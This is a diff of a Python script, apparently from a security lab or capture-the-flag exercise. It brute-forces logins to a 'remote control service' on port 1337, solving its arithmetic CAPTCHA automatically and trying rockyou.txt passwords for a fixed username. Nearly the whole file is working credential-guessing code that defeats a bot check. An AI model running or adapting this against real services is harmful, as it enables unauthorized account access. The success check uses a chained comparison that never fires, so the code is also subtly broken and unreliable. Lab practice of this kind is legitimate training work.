@@ -1,29 +1,3 @@
-"""
-    If you know the IP address of v0idcache's server and you
-    know the port number of the service you are trying to connect
-    to, you can use nc or telnet in your Linux terminal to interface
-    with the server. To do so, run:
-
-        $ nc <ip address here> <port here>
-
-    In the above the example, the $-sign represents the shell, nc is the command
-    you run to establish a connection with the server using an explicit IP address
-    and port number.
-
-    If you have the discovered the IP address and port number, you should discover
-    that there is a remote control service behind a certain port. You will know you
-    have discovered the correct port if you are greeted with a login prompt when you
-    nc to the server.
-
-    In this Python script, we are mimicking the same behavior of nc'ing to the remote
-    control service, however we do so in an automated fashion. This is because it is
-    beneficial to script the process of attempting multiple login attempts, hoping that
-    one of our guesses logs us (the attacker) into the Briong server.
-
-    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
-
-"""
-
 import socket
 import re
 import operator
@@ -34,81 +8,60 @@ port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force():
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+	file = open(wordlist,"r")
+	username = "ejnorman84"
+	regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
+	ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
+	counter = 0
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
+	for pw in file:
+		print("Attampt #" + str(counter) + " Trying Passowrd: " + pw)
+		counter += 1
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host, port))
 
-            Reading:
+		d1 = s.recv(1024)
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
+		while re.search(regex,d1) == None:
+			d1 = s.recv(1024)
 
-            Sending:
+		print("======data=====")
+		print("|"+d1+"|")
+		print("======end=====")
 
-                s.send("something to send\n")   # Send a newline \n at the end of your command
+		m = re.search(regex,d1)
+		firstNum = int(m.group('firstNum'))
+		secNum = int(m.group('secNum'))
+		op = m.group('op')
+		res = str(ops[op](firstNum,secNum))
+		print("answr is " + res)
+		s.send(res+"\n")
+		d2 = s.recv(1024)
+		while d2 == "\n":
+			d2 = s.recv(1024)
+		print("d2 is " + d2)
 
-        General idea:
+		s.send(username + "\n")
+		d3 = s.recv(1024)
+		while d3 == "\n":
+			d3 = s.recv(1024)
+		print("d3 is " + d3)
 
-            Given that you know a potential username, use a wordlist and iterate
-            through each possible password and repeatedly attempt to login to
-            v0idcache's server.
-    """
-    file = open(wordlist,"r")
-    username = "ejnorman84"
-    regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
+		s.send(pw + "\n")
+		d4 = s.recv(1024)
+		while d4 == "\n":
+			d4 = s.recv(1024)
 
-    for password in file:
-    	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    	s.connect((host, port))
-    	data = s.recv(1024)
-    	print("======data=====")
-    	print("|"+data+"|")
-    	print("======end=====")
-    	if data == "\n~~~ CAPTCHA ~~~\n" or data == "\n":
-    		s.send("\n")
-    		d1 = s.recv(1024)
-    	else:
-    		m = re.search(regex,data)
-         	firstNum = int(m.group('firstNum'))
-        	secNum = int(m.group('secNum'))
-        	op = m.group('op')
-        	print(firstNum)
-        	print(secNum)
-        	print(op)
-        	ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
-            	res = str(ops[op](firstNum,secNum))
-        	print(res)
-        	s.send(res + "\n")
-        	d1 = s.recv(1024)
-        	
-        	if "Username" in d1 == False:
-    			print(d1)
-    			print("fail fail fail")
-    			return
-    	
-    	
-
-    	s.send(username + "\n")
-    	d2 = s.recv(1024)
+		print("d4 result is " + d4)
+		if "Fail" in d4 == False:
+			print("SUCCESS")
+			print("PASSWORD: " + pw)
+			return
 
 
 
-    	s.send(password + "\n")
-    	d3 = s.recv(1024)
-    	if "Fail" in d3 == False:
-    		print(d3)
-	    	print("password is: " + password)
-	    	return
-
-
-
-
-
+		s.close()
+		print("++++s closed++++")
 
 if __name__ == '__main__':
-    brute_force()
-
+	brute_force()
